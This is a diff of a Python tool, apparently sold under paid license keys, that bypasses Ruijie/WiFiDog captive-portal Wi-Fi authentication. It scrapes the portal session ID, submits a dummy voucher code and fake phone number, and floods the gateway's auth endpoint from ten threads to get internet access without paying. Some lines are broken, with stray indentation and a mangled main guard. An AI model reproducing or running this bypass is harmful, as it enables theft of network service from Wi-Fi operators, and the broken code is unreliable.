@@ -1,128 +1,267 @@
 import requests
+import re
+import urllib3
 import time
-import sys
+import threading
+import logging
 import random
-from datetime import datetime
+import sys
+import datetime
+from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
+from rich.text import Text
 
-# SSL Warning များကို ပိတ်ထားရန် (Screenshot ထဲက Error အတွက်)
-import urllib3
+# ===============================
+# CONFIG & INITIALIZATION
+# ===============================
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# Console Setup
 console = Console()
 
-# Colors (စာလုံးပေါင်း မှန်ကန်စွာ သတ်မှတ်ထားသည်)
-RED = "\033[1;31m"
-GREEN = "\033[1;32m"
-YELLOW = "\033[1;33m"
-CYAN = "\033[1;36m"
+PING_THREADS = 10
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
+DEBUG = False
+
+# COLOR SYSTEM
+RED = "\033[91m"
+GREEN = "\033[92m"
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+MAGENTA = "\033[95m"
 RESET = "\033[0m"
 
-def display_hacker_flag():
-    banner = f"""{CYAN}
-    ███████╗██╗   ██╗ █████╗ ███╗   ██╗
-    ╚══███╔╝╚██╗ ██╔╝██╔══██╗████╗  ██║
-      ███╔╝  ╚████╔╝ ███████║██╔██╗ ██║
-     ███╔╝    ╚██╔╝  ██╔══██║██║╚██╗██║
-    ███████╗   ██║   ██║  ██║██║ ╚████║
-    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝{RESET}
+# LOGGING
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(message)s",
+    datefmt="%H:%M:%S"
+)
+
+stop_event = threading.Event()
+
+# ===============================
+# GITHUB DATABASE CONFIG
+# ===============================
+URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
+
+BANNER = """
+[bold #00FF00]
+  ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
+  ╚════██╗╚██╗ ██╔╝██╔══██╗████╗  ██║
+   █████╔╝ ╚████╔╝ ███████║██╔██╗ ██║
+  ██╔═══╝   ╚██╔╝  ██╔══██║██║╚██╗██║
+  ███████╗   ██║   ██║  ██║██║ ╚████║
+  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
+    [#00FF00]Z Y A N   B Y P A S S[/#00FF00]
+[/bold #00FF00]
+"""
+
+# ===============================
+# UI FUNCTIONS
+# ===============================
+def display_wifi_logo():
+    wifi_art = """
+[bold cyan]      .     [/bold cyan]
+[bold cyan]    . . .   [/bold cyan]
+[bold cyan]  . . . . . [/bold cyan]
+[bold cyan]      |     [/bold cyan]
     """
-    console.print(Align.center(banner))
-    console.print(Align.center(f"{YELLOW}--- [ ALADDIN BYPASS PREMIUM ] ---{RESET}"))
+    console.print(Align.center(Panel(wifi_art, border_style="bold cyan", padding=(0, 0), expand=False)))
+    console.print(Align.center(BANNER))
+    console.print(Align.center("[bold cyan]ZYAN BYPASS PRO ENGINE v5.2[/bold cyan]"))
+    console.print(Align.center("[bold #333333]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold #333333]\n"))
 
-def check_license():
-    # အစ်ကို့ GitHub ရဲ့ Raw Link အမှန်
-    KEY_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
-    console.clear()
-    display_hacker_flag()
+def simpler_hacker_typing(text, style="bold green"):
+    prefix = "[bold #00FF00]>>> [/bold #00FF00]"
+    console.print(prefix, end="")
+    for char in text:
+        console.print(Text(char, style=style), end="")
+        sys.stdout.flush()
+        time.sleep(0.02)
+    console.print()
 
+def hacking_status(message, duration=0.8):
+    with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
+        time.sleep(duration + random.uniform(0.1, 0.4))
+
+def success_fireworks():
+    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
+    for _ in range(3):
+        for _ in range(12):
+            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"]) + " " * random.randint(1, 10)
+            console.print(Text(fire, style=random.choice(colors)))
+            time.sleep(0.03)
+        console.print(Align.center("[bold gold1]🎆 SYSTEM UNLOCKED 🎆[/bold gold1]"))
+        time.sleep(0.2)
+
+# ===============================
+# EXPIRY & LICENSE CHECK
+# ===============================
+def check_expiry(expiry_str):
     try:
-        # CY4N အမှားကို CYAN လို့ ပြင်ဆင်ထားပါတယ်
-        console.print(Panel(Align.center(f"{CYAN}AWAITING AUTHORIZATION KEY{RESET}"), border_style="bold cyan"))
-        user_key = console.input(f"\n{YELLOW} [SECURITY_ACCESS] @ ENTER KEY: {RESET}").strip()
+        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
+        current_date = datetime.datetime.now()
         
-        if not user_key:
-            console.print(f"\n{RED}[!] ERROR: NULL KEY PROVIDED")
-            sys.exit()
+        if current_date > expiry_date:
+            return False, expiry_date.strftime('%d-%b-%Y')
+        return True, expiry_date.strftime('%d-%b-%Y')
+    except:
+        return True, "Lifetime"
 
-        with console.status("[bold green]Connecting to Server...", spinner="dots"):
-            # SSL Error မတက်အောင် verify=False ထည့်ထားပါတယ်
-            response = requests.get(KEY_URL, timeout=10, verify=False)
-            
-        if response.status_code != 200:
-            console.print(f"\n{RED}[!] SERVER ERROR: Could not connect.")
-            return False
-            
-        lines = response.text.splitlines()
+def check_license_hacker_style():
+    console.clear()
+    display_wifi_logo()
+    console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))
+    try:
+        user_key = input("\n  [SECURITY_ACCESS] @Zyan_").strip()
+    except EOFError:
+        user_key = ""
+    if not user_key:
+        console.print("\n[bold red][!] ERROR: NULL_KEY[/bold red]")
+        sys.exit()
+
+hacking_status("Connecting to GitHub Database...")
+    try:
+        response = requests.get(URL, timeout=10)
+        lines = [line.strip() for line in response.text.splitlines() if line.strip()]
         
-        for line in lines:
-            line = line.strip()
-            if not line: continue
-            
-            # Key:Expiry ပုံစံကို စစ်ဆေးခြင်း
-            if ":" in line:
-                try:
-                    stored_key, expiry_str = line.split(":")
-                    stored_key = stored_key.strip()
-                    expiry_str = expiry_str.strip()
-                    
-                    if user_key == stored_key:
-                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
-                        today = datetime.now().date()
-                        
-                        if today <= expiry_date:
-                            console.print(f"\n{GREEN}[✓] ACCESS GRANTED! VALID UNTIL: {expiry_str}{RESET}")
-                            time.sleep(1.5)
-                            return True
-                        else:
-                            console.print(f"\n{RED}[X] ACCESS DENIED: KEY EXPIRED!{RESET}")
-                            sys.exit()
-                except ValueError: continue 
+        found = False
+        hacking_status("Decrypting Database...")
+        
+        for entry in lines:
+            if "|" in entry:
+                db_key, exp_date = entry.split("|")
             else:
-                # Lifetime Key များအတွက်
-                if user_key == line:
-                    console.print(f"\n{GREEN}[✓] ACCESS GRANTED! (LIFETIME){RESET}")
-                    time.sleep(1.5)
+                db_key, exp_date = entry, "None"
+
+            if user_key == db_key:
+                is_active, date_label = check_expiry(exp_date)
+                
+                if is_active:
+                    success_fireworks()
+                    simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
+                    console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                     return True
-                    
-        console.print(f"\n{RED}[X] INVALID KEY! CONTACT @Zyan091")
+                else:
+                    simpler_hacker_typing("ACCESS_DENIED: KEY_EXPIRED", style="bold red")
+                    console.print(f"\n[bold red]❌ သင့် Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ ({date_label})[/bold red]")
+                    console.print("[bold yellow]⚠️ ကျေးဇူးပြု၍ Admin ထံတွင် သက်တမ်းတိုးပါ။[/bold yellow]")
+                    sys.exit()
+
+        simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
+        console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
         sys.exit()
 
     except Exception as e:
-        console.print(f"\n{RED}[!] ERROR: {e}")
+        console.print(f"\n[bold red]📡 DATABASE ERROR: Check internet connection.[/bold red]")
+        if DEBUG: print(e)
         sys.exit()
 
+# ===============================
+# BYPASS ENGINE FUNCTIONS
+# ===============================
+def check_real_internet():
+    try:
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
+    except:
+        return False
+
+def bypass_banner():
+    print(f"""{MAGENTA}
+╔══════════════════════════════════════╗
+║        Ruijie All Version Bypass     ║
+║          Zyan Special Edition        ║
+╚══════════════════════════════════════╝
+{RESET}""")
+
+def high_speed_ping(auth_link, sid):
+    session = requests.Session()
+    while not stop_event.is_set():
+        try:
+            session.get(auth_link, timeout=5)
+            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
+        except:
+            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
+            break
+        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
+
 def start_bypass_process():
-    console.print(f"\n{CYAN}[*] Initializing Bypass Engine...{RESET}")
-    time.sleep(1)
-    console.print(f"{GREEN}[+] Packets Injected Successfully!{RESET}")
-    time.sleep(1)
-    console.print(f"{YELLOW}[!] Turbo Engine Activated.{RESET}")
+    bypass_banner()
+    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
+
+    while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+        try:
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
+                    time.sleep(5)
+                    continue
+
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
+
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+
+            if not sid:
+                logging.warning(f"{RED}Session ID Not Found{RESET}")
+                time.sleep(5)
+                continue
+
+print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
+            
+            voucher_api = f"{portal_host}/api/auth/voucher/"
+            try:
+                session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+            except:
+                pass
+
+            params = parse_qs(parsed_portal.query)
+            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+            gw_port = params.get('gw_port', ['2060'])[0]
+            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+
+            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
+            for _ in range(PING_THREADS):
+                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+
+            while check_real_internet():
+                time.sleep(5)
+        except Exception as e:
+            if DEBUG:
+                logging.error(f"{RED}Error: {e}{RESET}")
+            time.sleep(5)
 
 # ===============================
-# MAIN RUNNER (Underline __ များ မကျန်စေရန် သေချာရေးထားပါသည်)
+# MAIN EXECUTION
 # ===============================
-if __name__ == "__main__":
-    try:
-        if check_license():
-            with console.status("[bold green]Loading Modules...", spinner="shark"):
-                time.sleep(2)
-            
-            console.print(Panel(
-                Align.center("[bold white]🔥 BYPASS ACTIVATED BY ZYAN 🔥[/bold white]"),
-                border_style="bold red",
-                expand=False
-            ))
+if name == "main":
+    if check_license_hacker_style():
+        with console.status("[bold green]Injecting Packets...", spinner="shark"):
+            time.sleep(2)
+        
+        console.print(Panel(
+            Align.center("[bold white]🔥 ZYAN BYPASS ACTIVATED 🔥[/bold white]"),
+            border_style="bold red",
+            expand=False
+        ))
+        
+        try:
             start_bypass_process()
-            
-            # Tool ပြီးသွားရင် ပိတ်မသွားအောင် ဤနေရာတွင် ရပ်ထားပါမည်
-            console.print(f"\n{YELLOW}[!] Tool is running. Press CTRL+C to stop.{RESET}")
-            while True:
-                time.sleep(100)
-                
-    except KeyboardInterrupt:
-        print(f"\n{RED}Operation Cancelled. Exiting...{RESET}")
-        sys.exit()   
+        except KeyboardInterrupt:
+            stop_event.set()
+            print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
